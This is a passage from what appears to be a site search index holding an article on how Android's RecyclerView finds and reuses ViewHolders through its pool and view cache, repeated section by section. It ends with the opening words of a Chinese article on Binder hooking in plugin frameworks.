adapter\u2019s onCreateViewHolder() method. It then binds the View via onBindViewHolder() if necessary, and finally returns it. As you see, there\u2019s a lot going on here, much more than just one pool of reusable ViewHolders as one may have expected. Our goal is to figure out what all those caches are about, how they work and why they are needed. We\u2019ll go through them one by one (in the order I think would be the best), and our first stop is the RecycledViewPool. RecycledViewPool We\u2019d like to have an answer to a few questions about each kind of cache: what is its backing data structure, under which conditions the ViewHolders are stored there and retrieved from there, and, most importantly, what\u2019s the purpose of it. You probably know the purpose of the pool very well: while scrolling, say, downwards the views that disappear on top are recycled into the pool to be reused for the views that emerge from the bottom. We\u2019ll talk about other scenarios where ViewHolders go to the pool a little bit later. But first let\u2019s take a look at some of the RecycledViewPool\u2019s code (which is an inner class of RecyclerView.Recycler): public static classRecycledViewPool {private SparseArray<ArrayList<ViewHolder>> mScrap =new SparseArray<>();private SparseIntArray mMaxScrap = new SparseIntArray(); \u2026public ViewHolder getRecycledView(int viewType) {ArrayList<ViewHolder> scrapHeap = mScrap.get(viewType); \u2026 First of all, don\u2019t let the name mScrap confuse you \u2014 this has nothing to do with attached or changed scrap mentioned in the list above. We see that each view type has its own pool of ViewHolders. When RecyclerView runs out of all other possibilities during a search for a ViewHolder, it asks the pool to give a ViewHolder with correct view type; at that point, view type is the only thing that matters. Now, each view type has it\u2019s own capacity. It is 5 by default, but you can change it like that: recyclerView.getRecycledViewPool() .setMaxRecycledViews(***SOME_VIEW_TYPE***, ***POOL_CAPACITY***); This is a very important point of flexibility. If you have dozens of same-type items on screen, which often change simultaneously, make the pool bigger for that view type. And if you know, that items of some view type are so rare, that they never appear on screen in quantity more than one, set the pool size 1 for that view type. Otherwise sooner or later the pool will be filled with 5 of those items, and 4 of them will just sit there unused, which is a waste of memory. The methods getRecyclerView() , putRecycledView() , clear() are public, so you can manipulate the contents of the pool. Using putRecycledView() manually, e.g. in order to prepare some ViewHolders beforehand, is a bad idea, though. You should create ViewHolder only in onCreateViewHolder() method of your Adapter, otherwise the ViewHolders can appear in states that RecyclerView doesn\u2019t expect. \u00b2 Another cool feature is that along with the getter getRecycledViewPool() there is a setter setRecycledViewPool() , so you can reuse a single pool for multiple RecycleViews. Finally, I\u2019ll note that the pool for each view type works as a stack (last in \u2014 first out). We\u2019ll see why this is good later. Ways to pool Now let\u2019s address the question of when the ViewHolders are thrown into the pool. There are 5 scenarios: A view went out of RecyclerView\u2019s bounds during scrolling. Data has changed so that the view is no longer seen. Addition to the pool happens when the disappearance animation finishes. An item in the view cache has been updated or removed. During a search for a ViewHolder, one was found in scrap or cache with position we want, but turned out to be unsuitable because of the wrong view type or id (if adapter has stable ids). \u00b3 The LayoutManager added a view at pre-layout, but didn\u2019t add that view in post-layout. The first two scenarios are pretty obvious. One thing to note, though, is that scenario 2 is triggered not only by removal of an item in question, but also, for example, by insertion of other items, which push the given item out of bounds. The other scenarios require a bit of comment. We\u2019ve not covered the view cache and scrap yet, but the idea behind scenarios 3 and 4 is simple. The pool is a place for the views we know to be \u201cdirty\u201d and requiring rebinding. ViewHolders in all caches, except for the pool, retain some of their state (most importantly, positions). All those caches are searched by position in hope that some ViewHolder can be reused as-is. By contrast, when a view goes to pool, it\u2019s state (all the flags, position, etc.) is cleared. The only things that remain are associated view and the view type. The pool is searched by the view type, as we know, and when a ViewHolder is found there, it starts a new life. Given that picture, scenarios 3 and 4 shouldn\u2019t be a mystery: for example, if we see a item in the view cache being removed, there\u2019s no point in holding it in that cache any more, since it won\u2019t be reused as-is for the same position. It\u2019s not nice to throw it away completely, though, so we throw it into the pool instead. The last scenario requires us to know what pre-layout and post-layout are. Well, let\u2019s just go ahead and figure that out! That scenario is definitely not the most crucial aspect of the pre/post-layout mechanism, but this mechanism is hugely important in general and is manifesting itself in every part of RecyclerView, so we\u2019ll have to know it anyway. Offtopic: pre-layout, post-layout and predictive animations Consider a scenario where we have items a, b and c, of which a and b fit on the screen. We delete the b , which brings c into view: What we\u2019d like to see is c smoothly sliding from the bottom up to it\u2019s new place. But how can that happen? We know the final location of c from the new layout, but how do we know where it should slide from? It would be wrong of RecyclerView or ItemAnimator to just assume by looking at the new layout that c should come from the bottom. We might have some custom LayoutManager where it should come from the side or something. So we need some more help from the LayoutManager. Can we use the previous layout? No, there\u2019s no \u0441 there. At that point no-one new that b was going to be deleted, so laying out c was rightly considered by LayoutManager to be a waste of resources. The solution guys at Google offered is as follows. After a change in the Adapter happens, the RecyclerView requests not one but two layouts from the LayoutManager. The first one \u2014 the pre-layout, lays out items in the previous adapter state, but uses the adapter changes as a hint that it might be a good idea to lay out some extra views. In our example, since we now know that b is being deleted, we additionally lay out c , despite the fact it\u2019s out of bounds. The second one \u2014 the post-layout, is just a normal layout corresponding to the adapter state after the changes. Now, by comparing the locations of c in pre-layout and post-layout, we can animate its appearance properly. This kind of animation \u2014 when the animated view is not present either in previous layout or in the new one \u2014 is called predictive animation, which is one of the most important concepts in RecyclerView. We\u2019ll discuss it in greater detail in later parts of this series. But now let\u2019s quickly look at another example: what if b is changed instead of being deleted? This might come as a surprise, but the LayoutManager still lays out c in the pre-layout phase. Why? Because maybe the change of b would make it become smaller in height, who knows? And if b becomes smaller, c might pop up from the bottom, so we better lay it out in pre-layout. But then later, in post-layout, it appeared to be not the case, say we just changed some TextView inside b. So c is not needed, and is thrown into the pool. That\u2019s the scenario 5 of getting oneself into the pool. It is hopefully clear now and we can go back to the RecycledViewPool. RecycledViewPool, continued When we encounter one of the scenarios when a ViewHolder should go to the pool, there are still two more obstacles on its way there: it might not be recyclable and it\u2019s View might be in transient state. Recyclability Recyclability is just a flag in ViewHolder, that you can manipulate by using setIsRecyclable() method of ViewHolder class. RecycleView makes use of it as well, making ViewHolders non-recyclable during animations. Manipulating a single flag from different independent places is usually a bad idea. For example, RecyclerView calls setIsRecyclable(true) when animation ends, by you don\u2019t want it to be recyclable for some reason specific to your application. But things don\u2019t actually break in this case because calls to setIsRecyclable() are paired. That is, if you call setIsRecyclable(false) twice, then calling setIsRecyclable(true) only once doesn\u2019t make the ViewHolder recyclable, you need to call it twice as well. Transient state The View\u2019s transient state is a very similar thing. It\u2019s a flag in the View, manipulated by setHasTransientState() method, and the calls are paired as well. The View class itself doesn\u2019t use the flag, but just holds it. It serves as a hint for widgets like ListView and RecyclerView, that it\u2019s better not to reuse this View for new content at this time. You can set this flag yourself, but also the ViewPropertyAnimator (that is when you do someView.animate()\u2026 ) automatically sets it to true at the start and to false at the end of animation. \u2074 Note that if you use, for example, a ValueAnimator to animate your views, you would have to manage the transient state yourself. One last thing to note about the transient state is that it is propagated from children to parents, all the way up to the root view. So if you animate some internal view of an item in the list, not only that view, but the item\u2019s root view, which a ViewHolder holds reference to, goes to transient state. OnFailedToRecycleView If a ViewHolder about to be recycled fails either recyclability or transient state check, the onFailedToRecycleView() method of your Adapter is called. Now, this is a really important point: this method is not just a notification of an event, but a question to you on how this situation should be dealt with. Returning true from onFailedToRecycledView() means \u201crecycle it anyway\u201d. One situation where this is appropriate is when you clear all the animations and other sources of this trouble when binding a new item. Alternatively, you can deal with these things right in the onFailedToRecycledView() method. What you shouldn\u2019t do is to ignore onFailedToRecycledView() completely. One scenario in which that might hurt you is the following. Imagine you are fading in images in the items when they come into view. If the user scrolls your list fast enough, the images won\u2019t finish fading in when they go out of view, rendering the ViewHolders ineligible for recycling. So you\u2019ll have laggy scroll, and on top of that, new and new ViewHolders will be created, cluttering the memory. For Russian-speaking readers I recommend this talk by Konstantin Zaikin, where, among other things, this scenario is shown in action: https://events.yandex.ru/lib/talks/3456/ Succeeding in recycling a ViewHolder leads to a call to onViewRecycled() method, which is a good place to release heavy resources, such as images. Remember that some ViewHolder instances can end up sitting in the pool for a long time without usage, which may be a big waste of memory. We now move on to the next cache \u2014 the view cache. View Cache When I say \u201cview cache\u201d or just \u201ccache\u201d what I refer to is mCachedViews field found in RecyclerView.Recycler class. It\u2019s also called \u201cfirst level cache\u201d in some comments in the code. This is just an ArrayList of ViewHolders, no splitting by view types here. The default capacity is 2, and you can tweak it via setItemViewCacheSize() method of RecyclerView. As I mentioned before, the most important difference between the pool and other caches (including the view cache), is that those other caches are searched for a ViewHolder associated with given position, while the pool is searched by view type. When a ViewHolder is in the view cache, we hope to to reuse it \u201cas-is\u201d, without rebinding, at the same position as the one it was at before it got into the cache. So let\u2019s make this distinction perfectly clear: If a ViewHolder was found nowhere , it is created and bound . If a ViewHolder was found in pool , it is bound . If a ViewHolder was found in cache , there is nothing to be done. At this point one important thing becomes very clear: a ViewHolder being bound and recycled into pool ( onViewRecycled() ) is not the same thing as an item in list going in and out of visible bounds. When it goes out, its ViewHolder can go to view cache instead of pool, and when it comes in, the ViewHolder is sometimes retrieved from view cache and is not bound. If you need to track the presence of items on screen, use the onViewAttachedToWindow() and onViewDetachedFromWindow() callbacks of your Adapter. Filling pool and cache Now, to the next question: how do ViewHolders end up in the view cache? When I was talking about the scenarios, which lead to the pool, I actually deceived you a little bit. In those scenarios (except for the third one) the ViewHolder goes either to the cache or to the pool. \u2075 Let me illustrate the rules by which either the cache or the pool is selected. Say, we have empty pool and cache initially and recycle the items one by one. This is how the pool and the cache is filled (assuming default capacities and one view type): So, as long as the cache isn\u2019t full, ViewHolders go there. If it\u2019s full, a new ViewHolder pushes a ViewHolder from the \u201cother end\u201d of the cache into the pool. If a pool is already full, that ViewHolder is pushed into oblivion, to the garbage collector that is. \u2076 Pool and Cache in Action Now let\u2019s look at the way pool and cache behave in a couple of actual RecyclerView usage scenarios. Consider scrolling: As we scroll downwards, there is a \u201ctail\u201d behind the currently seen items consisting of cached items and then a pooled item. When the item 8 appears on screen, no suitable ViewHolder is found in cache: no ViewHolder associated with position 8 there. So we use a pooled ViewHolder, which was previously at position 3. When item 6 disappears on top, it goes to the cache, pushing 4 into the pool. The picture is different when we start scrolling in the opposite direction: Here we find a ViewHolder for position 5 in view cache and reuse it right away, without rebinding. And that seems to be the main use-case of the cache \u2014 to make scrolling in opposite direction, to the items we\u2019ve just seen, more efficient. So if you have a news feed, the cache might be useless, since users won\u2019t go back too often. But if it\u2019s a list of things to choose from, say a gallery of wallpapers, you might want to extend the capacity of the cache. A couple of things to note here. First, what if we scroll up to view 3? Remember that the pool works like a stack, so if we didn\u2019t do anything but scrolling since the last time we saw 3, then the ViewHolder 3 will be the last one to be put into the pool and thus is now chosen to be rebound at position 3. If the data didn\u2019t change, we actually don\u2019t need to do any rebinding. You should always check in your onBindViewHolder() if you actually need to change this TextView or that ImageView etc., and this is an example of a situation when you don\u2019t. Second, notice that there is always no more than one item (per view type) in the pool while scrolling! (Of course, if you have a multi-column grid with n columns, then you\u2019ll have n items in the pool.) The other items that ended up in the pool via scenarios 2\u20135, just stay there uselessly during scrolling. Now let\u2019s look at a scenario, in which, by contrast, lots of items go into the pool: calling notifyDataSetChanged() (or notifyItemRangeChanged() with some wide range): All the ViewHolders become invalid, cache is not a suitable place for them, and they all try to go to pool. There might be not enough space for them, so some unlucky ones will be garbage collected and then created again. In contrast to scrolling, you might want a bigger pool in this situation. Another case in which a big pool is useful is jumping from one position to another programmatically via scrollToPosition() . So how do we choose the optimal size of the pool? It seems that the optimal strategy is to extend the pool right before you\u2019ll need it to be big, and shrink it right afterwards. One dirty way to implement this is the following: **recyclerView**.getRecycledViewPool().setMaxRecycledViews(0, 20);**adapter**.notifyDataSetChanged();**new** Handler().post(**new** Runnable() { @Override **public void** run() { **recyclerView**.getRecycledViewPool() .setMaxRecycledViews(0, 1); }}); Continued here: https://medium.com/@pavelshmakov/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-continued-d81c631a2b91 ^ \u00b9 In fact, even understanding public API of RecyclerView requires you to know some of the inner workings. For example, the javadoc to setHasStableIds() method tells you nothing about why would you want to use it. ^ \u00b2 E.g. the correct view type is set in createViewHolder() method right after the Adapter call, and the field is package local, so you can\u2019t set it yourself. ^ \u00b3An example when this happens: change the item, so that it\u2019s view type changes, call notifyItemChanged() . Also, disable change animations in your ItemAnimator, otherwise scenario 2 will happen. ^ \u2074 One other example of View being in transient state is EditText with some text being selected or in the process of editing. ^ \u2075 The recyclability and transient state checks come before selection between cache and pool, which to be honest doesn\u2019t make much sense to me, since views in cache are supposed to reappear exactly in the state they were when disappearing. ^ \u2076 In support version 23 this mechanism is broken by a simple off-by-one indexing mistake. The number of ViewHolders in the cache alternates between 1 and 2 as we recycle ViewHolders one by one. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/android-news/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-404ba3453714","title":"Anatomy of RecyclerView:a Search for a ViewHolder"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#anatomy-of-recyclerviewa-search-for-a-viewholder","text":"Pavel Shmakov FollowMar 11, 2017","title":"Anatomy of RecyclerView:a Search for a ViewHolder"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#15-min-readanatomy-of-recyclerview-a-search-for-a-viewholder","text":"","title":"\u00b715 min readAnatomy of RecyclerView: a Search for a ViewHolder"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#intro","text":"In this series of articles I\u2019m going to share my knowledge of the inner workings of RecyclerView. Why? Just think about it: RecyclerView is needed almost in every modern Android app, so the way developers work with it affects the experience of millions and millions of users. And yet, what kind of educational material on RecyclerView do we have? You can surely find some basic tutorials on how to use RecyclerView, but what about how it works ? The \u201cblack box\u201d approach is definitely not good enough, especially if you are doing complex customizations or optimizing the performance. \u00b9 The \u201cdeepest\u201d material out there is probably the RecyclerView ins and outs talk at Google I/O 2016, which I recommend, but seriously, that\u2019s not even close to \u201cins and outs\u201d, that\u2019s just the tip of the iceberg. My goal is to go deeper than that. I assume that the reader has basic knowledge of RecyclerView, stuff like what LayoutManager is, how to notify Adapter of particular changes in data or how to use item view types. In this first part we will be figuring out what\u2019s going on in just one method inside RecyclerView: getViewByPosition() . This is one of the most crucial bits of source code, and by studying it, we will learn about many aspects of RecyclerView, such as ViewHolder recycling, hidden views, predictive animations and stable ids. You may be surprised to see predictive animations here. Well, the thing is, despite the best efforts of guys at Google to decouple responsibilities of different components of RecyclerView, a lot of \u201cknowledge\u201d is still shared between them, predictive animations being one of those things. There is no way to avoid talking about them at one point or another. So, during laying items out the LayoutManager asks the RecyclerView \u201cplease give me a View at position 8\u201d. And here is what RecycleView does in response: Searches changed scrap Searches attached scrap Searches non-removed hidden views Searches the view cache If Adapter has stable ids, searches attached scrap and view cache again for given id. Searches the ViewCacheExtension Searches the RecycledViewPool If it fails to find a suitable View in all of those places, it creates one by calling adapter\u2019s onCreateViewHolder() method. It then binds the View via onBindViewHolder() if necessary, and finally returns it. As you see, there\u2019s a lot going on here, much more than just one pool of reusable ViewHolders as one may have expected. Our goal is to figure out what all those caches are about, how they work and why they are needed. We\u2019ll go through them one by one (in the order I think would be the best), and our first stop is the RecycledViewPool.","title":"Intro"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#recycledviewpool","text":"We\u2019d like to have an answer to a few questions about each kind of cache: what is its backing data structure, under which conditions the ViewHolders are stored there and retrieved from there, and, most importantly, what\u2019s the purpose of it. You probably know the purpose of the pool very well: while scrolling, say, downwards the views that disappear on top are recycled into the pool to be reused for the views that emerge from the bottom. We\u2019ll talk about other scenarios where ViewHolders go to the pool a little bit later. But first let\u2019s take a look at some of the RecycledViewPool\u2019s code (which is an inner class of RecyclerView.Recycler): public static classRecycledViewPool {private SparseArray<ArrayList<ViewHolder>> mScrap =new SparseArray<>();private SparseIntArray mMaxScrap = new SparseIntArray(); \u2026public ViewHolder getRecycledView(int viewType) {ArrayList<ViewHolder> scrapHeap = mScrap.get(viewType); \u2026 First of all, don\u2019t let the name mScrap confuse you \u2014 this has nothing to do with attached or changed scrap mentioned in the list above. We see that each view type has its own pool of ViewHolders. When RecyclerView runs out of all other possibilities during a search for a ViewHolder, it asks the pool to give a ViewHolder with correct view type; at that point, view type is the only thing that matters. Now, each view type has it\u2019s own capacity. It is 5 by default, but you can change it like that: recyclerView.getRecycledViewPool() .setMaxRecycledViews(***SOME_VIEW_TYPE***, ***POOL_CAPACITY***); This is a very important point of flexibility. If you have dozens of same-type items on screen, which often change simultaneously, make the pool bigger for that view type. And if you know, that items of some view type are so rare, that they never appear on screen in quantity more than one, set the pool size 1 for that view type. Otherwise sooner or later the pool will be filled with 5 of those items, and 4 of them will just sit there unused, which is a waste of memory. The methods getRecyclerView() , putRecycledView() , clear() are public, so you can manipulate the contents of the pool. Using putRecycledView() manually, e.g. in order to prepare some ViewHolders beforehand, is a bad idea, though. You should create ViewHolder only in onCreateViewHolder() method of your Adapter, otherwise the ViewHolders can appear in states that RecyclerView doesn\u2019t expect. \u00b2 Another cool feature is that along with the getter getRecycledViewPool() there is a setter setRecycledViewPool() , so you can reuse a single pool for multiple RecycleViews. Finally, I\u2019ll note that the pool for each view type works as a stack (last in \u2014 first out). We\u2019ll see why this is good later. Ways to pool Now let\u2019s address the question of when the ViewHolders are thrown into the pool. There are 5 scenarios: A view went out of RecyclerView\u2019s bounds during scrolling. Data has changed so that the view is no longer seen. Addition to the pool happens when the disappearance animation finishes. An item in the view cache has been updated or removed. During a search for a ViewHolder, one was found in scrap or cache with position we want, but turned out to be unsuitable because of the wrong view type or id (if adapter has stable ids). \u00b3 The LayoutManager added a view at pre-layout, but didn\u2019t add that view in post-layout. The first two scenarios are pretty obvious. One thing to note, though, is that scenario 2 is triggered not only by removal of an item in question, but also, for example, by insertion of other items, which push the given item out of bounds. The other scenarios require a bit of comment. We\u2019ve not covered the view cache and scrap yet, but the idea behind scenarios 3 and 4 is simple. The pool is a place for the views we know to be \u201cdirty\u201d and requiring rebinding. ViewHolders in all caches, except for the pool, retain some of their state (most importantly, positions). All those caches are searched by position in hope that some ViewHolder can be reused as-is. By contrast, when a view goes to pool, it\u2019s state (all the flags, position, etc.) is cleared. The only things that remain are associated view and the view type. The pool is searched by the view type, as we know, and when a ViewHolder is found there, it starts a new life. Given that picture, scenarios 3 and 4 shouldn\u2019t be a mystery: for example, if we see a item in the view cache being removed, there\u2019s no point in holding it in that cache any more, since it won\u2019t be reused as-is for the same position. It\u2019s not nice to throw it away completely, though, so we throw it into the pool instead. The last scenario requires us to know what pre-layout and post-layout are. Well, let\u2019s just go ahead and figure that out! That scenario is definitely not the most crucial aspect of the pre/post-layout mechanism, but this mechanism is hugely important in general and is manifesting itself in every part of RecyclerView, so we\u2019ll have to know it anyway.","title":"RecycledViewPool"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#offtopic-pre-layout-post-layout-and-predictive-animations","text":"Consider a scenario where we have items a, b and c, of which a and b fit on the screen. We delete the b , which brings c into view: What we\u2019d like to see is c smoothly sliding from the bottom up to it\u2019s new place. But how can that happen? We know the final location of c from the new layout, but how do we know where it should slide from? It would be wrong of RecyclerView or ItemAnimator to just assume by looking at the new layout that c should come from the bottom. We might have some custom LayoutManager where it should come from the side or something. So we need some more help from the LayoutManager. Can we use the previous layout? No, there\u2019s no \u0441 there. At that point no-one new that b was going to be deleted, so laying out c was rightly considered by LayoutManager to be a waste of resources. The solution guys at Google offered is as follows. After a change in the Adapter happens, the RecyclerView requests not one but two layouts from the LayoutManager. The first one \u2014 the pre-layout, lays out items in the previous adapter state, but uses the adapter changes as a hint that it might be a good idea to lay out some extra views. In our example, since we now know that b is being deleted, we additionally lay out c , despite the fact it\u2019s out of bounds. The second one \u2014 the post-layout, is just a normal layout corresponding to the adapter state after the changes. Now, by comparing the locations of c in pre-layout and post-layout, we can animate its appearance properly. This kind of animation \u2014 when the animated view is not present either in previous layout or in the new one \u2014 is called predictive animation, which is one of the most important concepts in RecyclerView. We\u2019ll discuss it in greater detail in later parts of this series. But now let\u2019s quickly look at another example: what if b is changed instead of being deleted? This might come as a surprise, but the LayoutManager still lays out c in the pre-layout phase. Why? Because maybe the change of b would make it become smaller in height, who knows? And if b becomes smaller, c might pop up from the bottom, so we better lay it out in pre-layout. But then later, in post-layout, it appeared to be not the case, say we just changed some TextView inside b. So c is not needed, and is thrown into the pool. That\u2019s the scenario 5 of getting oneself into the pool. It is hopefully clear now and we can go back to the RecycledViewPool.","title":"Offtopic: pre-layout, post-layout and predictive animations"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#recycledviewpool-continued","text":"When we encounter one of the scenarios when a ViewHolder should go to the pool, there are still two more obstacles on its way there: it might not be recyclable and it\u2019s View might be in transient state. Recyclability Recyclability is just a flag in ViewHolder, that you can manipulate by using setIsRecyclable() method of ViewHolder class. RecycleView makes use of it as well, making ViewHolders non-recyclable during animations. Manipulating a single flag from different independent places is usually a bad idea. For example, RecyclerView calls setIsRecyclable(true) when animation ends, by you don\u2019t want it to be recyclable for some reason specific to your application. But things don\u2019t actually break in this case because calls to setIsRecyclable() are paired. That is, if you call setIsRecyclable(false) twice, then calling setIsRecyclable(true) only once doesn\u2019t make the ViewHolder recyclable, you need to call it twice as well. Transient state The View\u2019s transient state is a very similar thing. It\u2019s a flag in the View, manipulated by setHasTransientState() method, and the calls are paired as well. The View class itself doesn\u2019t use the flag, but just holds it. It serves as a hint for widgets like ListView and RecyclerView, that it\u2019s better not to reuse this View for new content at this time. You can set this flag yourself, but also the ViewPropertyAnimator (that is when you do someView.animate()\u2026 ) automatically sets it to true at the start and to false at the end of animation. \u2074 Note that if you use, for example, a ValueAnimator to animate your views, you would have to manage the transient state yourself. One last thing to note about the transient state is that it is propagated from children to parents, all the way up to the root view. So if you animate some internal view of an item in the list, not only that view, but the item\u2019s root view, which a ViewHolder holds reference to, goes to transient state. OnFailedToRecycleView If a ViewHolder about to be recycled fails either recyclability or transient state check, the onFailedToRecycleView() method of your Adapter is called. Now, this is a really important point: this method is not just a notification of an event, but a question to you on how this situation should be dealt with. Returning true from onFailedToRecycledView() means \u201crecycle it anyway\u201d. One situation where this is appropriate is when you clear all the animations and other sources of this trouble when binding a new item. Alternatively, you can deal with these things right in the onFailedToRecycledView() method. What you shouldn\u2019t do is to ignore onFailedToRecycledView() completely. One scenario in which that might hurt you is the following. Imagine you are fading in images in the items when they come into view. If the user scrolls your list fast enough, the images won\u2019t finish fading in when they go out of view, rendering the ViewHolders ineligible for recycling. So you\u2019ll have laggy scroll, and on top of that, new and new ViewHolders will be created, cluttering the memory. For Russian-speaking readers I recommend this talk by Konstantin Zaikin, where, among other things, this scenario is shown in action: https://events.yandex.ru/lib/talks/3456/ Succeeding in recycling a ViewHolder leads to a call to onViewRecycled() method, which is a good place to release heavy resources, such as images. Remember that some ViewHolder instances can end up sitting in the pool for a long time without usage, which may be a big waste of memory. We now move on to the next cache \u2014 the view cache.","title":"RecycledViewPool, continued"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#view-cache","text":"When I say \u201cview cache\u201d or just \u201ccache\u201d what I refer to is mCachedViews field found in RecyclerView.Recycler class. It\u2019s also called \u201cfirst level cache\u201d in some comments in the code. This is just an ArrayList of ViewHolders, no splitting by view types here. The default capacity is 2, and you can tweak it via setItemViewCacheSize() method of RecyclerView. As I mentioned before, the most important difference between the pool and other caches (including the view cache), is that those other caches are searched for a ViewHolder associated with given position, while the pool is searched by view type. When a ViewHolder is in the view cache, we hope to to reuse it \u201cas-is\u201d, without rebinding, at the same position as the one it was at before it got into the cache. So let\u2019s make this distinction perfectly clear: If a ViewHolder was found nowhere , it is created and bound . If a ViewHolder was found in pool , it is bound . If a ViewHolder was found in cache , there is nothing to be done. At this point one important thing becomes very clear: a ViewHolder being bound and recycled into pool ( onViewRecycled() ) is not the same thing as an item in list going in and out of visible bounds. When it goes out, its ViewHolder can go to view cache instead of pool, and when it comes in, the ViewHolder is sometimes retrieved from view cache and is not bound. If you need to track the presence of items on screen, use the onViewAttachedToWindow() and onViewDetachedFromWindow() callbacks of your Adapter. Filling pool and cache Now, to the next question: how do ViewHolders end up in the view cache? When I was talking about the scenarios, which lead to the pool, I actually deceived you a little bit. In those scenarios (except for the third one) the ViewHolder goes either to the cache or to the pool. \u2075 Let me illustrate the rules by which either the cache or the pool is selected. Say, we have empty pool and cache initially and recycle the items one by one. This is how the pool and the cache is filled (assuming default capacities and one view type): So, as long as the cache isn\u2019t full, ViewHolders go there. If it\u2019s full, a new ViewHolder pushes a ViewHolder from the \u201cother end\u201d of the cache into the pool. If a pool is already full, that ViewHolder is pushed into oblivion, to the garbage collector that is. \u2076","title":"View Cache"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#pool-and-cache-in-action","text":"Now let\u2019s look at the way pool and cache behave in a couple of actual RecyclerView usage scenarios. Consider scrolling: As we scroll downwards, there is a \u201ctail\u201d behind the currently seen items consisting of cached items and then a pooled item. When the item 8 appears on screen, no suitable ViewHolder is found in cache: no ViewHolder associated with position 8 there. So we use a pooled ViewHolder, which was previously at position 3. When item 6 disappears on top, it goes to the cache, pushing 4 into the pool. The picture is different when we start scrolling in the opposite direction: Here we find a ViewHolder for position 5 in view cache and reuse it right away, without rebinding. And that seems to be the main use-case of the cache \u2014 to make scrolling in opposite direction, to the items we\u2019ve just seen, more efficient. So if you have a news feed, the cache might be useless, since users won\u2019t go back too often. But if it\u2019s a list of things to choose from, say a gallery of wallpapers, you might want to extend the capacity of the cache. A couple of things to note here. First, what if we scroll up to view 3? Remember that the pool works like a stack, so if we didn\u2019t do anything but scrolling since the last time we saw 3, then the ViewHolder 3 will be the last one to be put into the pool and thus is now chosen to be rebound at position 3. If the data didn\u2019t change, we actually don\u2019t need to do any rebinding. You should always check in your onBindViewHolder() if you actually need to change this TextView or that ImageView etc., and this is an example of a situation when you don\u2019t. Second, notice that there is always no more than one item (per view type) in the pool while scrolling! (Of course, if you have a multi-column grid with n columns, then you\u2019ll have n items in the pool.) The other items that ended up in the pool via scenarios 2\u20135, just stay there uselessly during scrolling. Now let\u2019s look at a scenario, in which, by contrast, lots of items go into the pool: calling notifyDataSetChanged() (or notifyItemRangeChanged() with some wide range): All the ViewHolders become invalid, cache is not a suitable place for them, and they all try to go to pool. There might be not enough space for them, so some unlucky ones will be garbage collected and then created again. In contrast to scrolling, you might want a bigger pool in this situation. Another case in which a big pool is useful is jumping from one position to another programmatically via scrollToPosition() . So how do we choose the optimal size of the pool? It seems that the optimal strategy is to extend the pool right before you\u2019ll need it to be big, and shrink it right afterwards. One dirty way to implement this is the following: **recyclerView**.getRecycledViewPool().setMaxRecycledViews(0, 20);**adapter**.notifyDataSetChanged();**new** Handler().post(**new** Runnable() { @Override **public void** run() { **recyclerView**.getRecycledViewPool() .setMaxRecycledViews(0, 1); }}); Continued here: https://medium.com/@pavelshmakov/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-continued-d81c631a2b91 ^ \u00b9 In fact, even understanding public API of RecyclerView requires you to know some of the inner workings. For example, the javadoc to setHasStableIds() method tells you nothing about why would you want to use it. ^ \u00b2 E.g. the correct view type is set in createViewHolder() method right after the Adapter call, and the field is package local, so you can\u2019t set it yourself. ^ \u00b3An example when this happens: change the item, so that it\u2019s view type changes, call notifyItemChanged() . Also, disable change animations in your ItemAnimator, otherwise scenario 2 will happen. ^ \u2074 One other example of View being in transient state is EditText with some text being selected or in the process of editing. ^ \u2075 The recyclability and transient state checks come before selection between cache and pool, which to be honest doesn\u2019t make much sense to me, since views in cache are supposed to reappear exactly in the state they were when disappearing. ^ \u2076 In support version 23 this mechanism is broken by a simple off-by-one indexing mistake. The number of ViewHolders in the cache alternates between 1 and 2 as we recycle ViewHolders one by one. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/android-news/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-404ba3453714","title":"Pool and Cache in Action"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/","text":"Android\u63d2\u4ef6\u5316\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4bBinder Hook Android\u7cfb\u7edf\u901a\u8fc7Binder\u673a\u5236\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u8bf8\u5982 ActivityManagerService \uff0c ClipboardManager \uff0c AudioManager \u7b49\uff1b\u8fd9\u4e9b\u5e7f\u6cdb\u5b58\u5728\u7cfb\u7edf\u670d\u52a1\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u8bf8\u5982\u4efb\u52a1\u7ba1\u7406\uff0c\u97f3\u9891\uff0c\u89c6\u9891\u7b49\u5f02\u5e38\u5f3a\u5927\u7684\u529f\u80fd\u3002 \u63d2\u4ef6\u6846\u67b6\u4f5c\u4e3a\u5404\u4e2a\u63d2\u4ef6\u7684\u7ba1\u7406\u8005\uff0c\u4e3a\u4e86\u4f7f\u5f97\u63d2\u4ef6\u80fd\u591f \u65e0\u7f1d\u5730 